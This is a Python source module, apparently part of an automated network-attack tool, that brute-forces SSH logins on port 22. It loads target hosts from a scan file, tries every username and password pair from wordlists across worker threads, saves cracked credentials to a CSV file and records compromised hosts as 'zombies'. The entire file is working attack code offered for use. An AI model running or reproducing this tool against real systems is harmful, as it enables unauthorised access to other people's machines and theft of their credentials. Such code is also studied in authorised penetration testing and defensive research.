"""
ssh_connector.py - This script performs a brute force attack on SSH services (port 22) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import csv
import paramiko
import socket
import threading
import logging
import time
from queue import Queue, Empty
from shared import SharedData
from logger import Logger
from timeout_utils import (
    join_threads_with_timeout,
    drain_queue_safely
)

# Configure the logger
logger = Logger(name="ssh_connector.py", level=logging.INFO)

# Define the necessary global variables
b_class = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port = 22
b_parent = None

class SSHBruteforce:
    """
    Class to handle the SSH brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ssh_connector = SSHConnector(shared_data)
        logger.info("SSHConnector initialized.")

    def bruteforce_ssh(self, ip, port, mac_address='', hostname=''):
        """
        Run the SSH brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
        return self.ssh_connector.run_bruteforce(ip, port, mac_address, hostname)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        start_time = time.time()
        logger.lifecycle_start("SSHBruteforce", ip, port)
        logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
        self.shared_data.bjornorch_status = "SSHBruteforce"
        # Extract hostname and MAC from the row passed by orchestrator
        hostname = row.get('Hostnames', '')
        mac_address = row.get('MAC Address', '')
        try:
            success, results = self.bruteforce_ssh(ip, port, mac_address, hostname)
            status = 'success' if success else 'no_creds_found'
        except Exception as e:
            logger.error(f"SSH bruteforce error for {ip}: {e}")
            status = 'error'
        finally:
            duration = time.time() - start_time
            logger.lifecycle_end("SSHBruteforce", status, duration, ip)
        return status

class SSHConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "22")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.sshfile = shared_data.sshfile
        if not os.path.exists(self.sshfile):
            logger.debug(f"Creating {self.sshfile}")
            with open(self.sshfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for SSH ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "22")

    def ssh_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SSH service using the given credentials.
        Reduced banner_timeout from 200s to 30s for faster failure detection.
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(adresse_ip, username=user, password=password,
                       banner_timeout=30, timeout=30, auth_timeout=30)
            return True
        except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
            return False
        finally:
            ssh.close()  # Ensure the SSH connection is closed

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        Uses graceful shutdown pattern with timeout on queue.get().
        """
        while True:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break
            try:
                item = self.queue.get(timeout=1.0)
            except Empty:
                if self.queue.empty():
                    break
                continue

            adresse_ip, user, password, mac_address, hostname, port = item
            try:
                if self.ssh_connect(adresse_ip, user, password):
                    with self.lock:
                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                        success_flag[0] = True
                    # File I/O outside lock
                    self.save_results()
                    self.removeduplicates()
                    self.shared_data.record_zombie(mac_address, adresse_ip)
            finally:
                self.queue.task_done()
                with self.progress_lock:
                    self.progress_count += 1
                    if self.progress_count % 50 == 0:
                        logger.info(f"Bruteforcing SSH... {self.progress_count}/{self.progress_total}")


    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
        # Use provided mac_address and hostname from orchestrator (more reliable)
        # Fallback to lookup if not provided
        if not mac_address or not hostname:
            self.load_scan_file()
            for row in self.scan:
                if row.get('IPs') == adresse_ip:
                    if not mac_address:
                        mac_address = row.get('MAC Address', '')
                    if not hostname:
                        hostname = row.get('Hostnames', '')
                    break

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing SSH on {adresse_ip}... (0/{total_tasks})")

        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        # Wait for queue with exit signal checking
        queue_timeout = self.shared_data.bruteforce_queue_timeout
        queue_start = time.time()
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                drain_queue_safely(self.queue)
                break
            if time.time() - queue_start > queue_timeout:
                logger.lifecycle_timeout("SSHBruteforce", "queue processing", queue_timeout, adresse_ip)
                drain_queue_safely(self.queue)
                break
            time.sleep(0.5)

        # Give workers time to finish current items
        time.sleep(2)

        # Join threads with timeout
        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
        if hanging:
            logger.warning(f"SSH bruteforce: {len(hanging)} threads did not terminate cleanly")

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful


    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        # Ensure file exists with header
        if not os.path.exists(self.sshfile):
            with open(self.sshfile, 'w', newline='') as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        with open(self.sshfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        rows = []
        if os.path.exists(self.sshfile):
            with open(self.sshfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.sshfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Starting SSH attack on port 22...")

        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()

        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total number of successes: {len(ssh_bruteforce.ssh_connector.results)}")
        exit(len(ssh_bruteforce.ssh_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
